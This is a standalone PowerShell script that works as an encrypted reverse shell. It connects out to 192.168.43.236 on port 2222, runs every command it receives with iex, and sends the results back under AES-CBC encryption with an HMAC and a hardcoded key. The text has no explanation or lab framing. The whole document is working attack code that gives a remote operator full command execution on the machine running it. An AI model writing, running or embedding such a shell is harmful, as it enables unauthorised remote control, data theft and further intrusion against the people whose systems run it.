function dec ($bb) { if ($bb.Length -gt 32) { $mac = $bb[-20..-1];$bb = $bb[0..($bb.length - 21)];$hmac = New-Object System.Security.Cryptography.HMACSHA1;$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($key);$exp = $hmac.ComputeHash($bb);if (@(Compare-Object $mac $exp -Sync 0).Length -ne 0) { return; }; $iv = $bb[0..15]; $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $enc.Mode = "CBC"; $enc.Key = [System.Text.Encoding]::utf8.GetBytes($key); $enc.IV = $iv; $byteee = ($enc.CreateDecryptor()).TransformFinalBlock(($bb[16..$bb.length]), 0, $bb.length-16); [System.Text.Encoding]::UTF8.GetString($byteee); }; }; function enc ($b) { $b = [System.Text.Encoding]::UTF8.GetBytes($b); $iv = [byte] 0..255 |Get-Random -Count 16; $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider; $enc.Mode = "CBC"; $enc.Key = [System.Text.Encoding]::UTF8.GetBytes($key); $enc.IV = $iv; $txt = $iv + ($enc.CreateEncryptor()).TransformFinalBlock($b, 0, $b.Length); $mac = New-Object System.Security.Cryptography.HMACSHA1;$mac.Key = [System.Text.Encoding]::utf8.GetBytes($key);$txt + $mac.ComputeHash($txt); }; $key = "Vp7tOgFygF4duwWo"; $cli = new-object system.net.sockets.tcpclient("192.168.43.236",2222); $str = $cli.getstream();$reader = New-Object System.IO.StreamReader $str; $write = New-Object System.IO.StreamWriter $str; $write.writeline("have a shell if you have a key
"); $write.flush(); while ($true) { [string]$msg = $reader.readline(); write-host "$msg"; try { $res = iex $msg; if ($res -eq $null) { write-host "null"; $enc = enc -b "null result"; $enc = $enc -join (' '); $write.writeline("$enc"); $write.flush(); $write.flush(); } else { $ress = "`n"; foreach ($tmp in $res) { $ress += $tmp + "`n"; }; write-host "$ress"; $enc = enc -b $ress; $enc = $enc -join (' '); $write.writeline("$enc"); $write.flush(); $write.flush(); }; } catch { write-host $_; $enc = enc -b "error: $_"; $enc = $enc -join (' '); $write.writeline("$enc"); $write.flush(); }; }; 
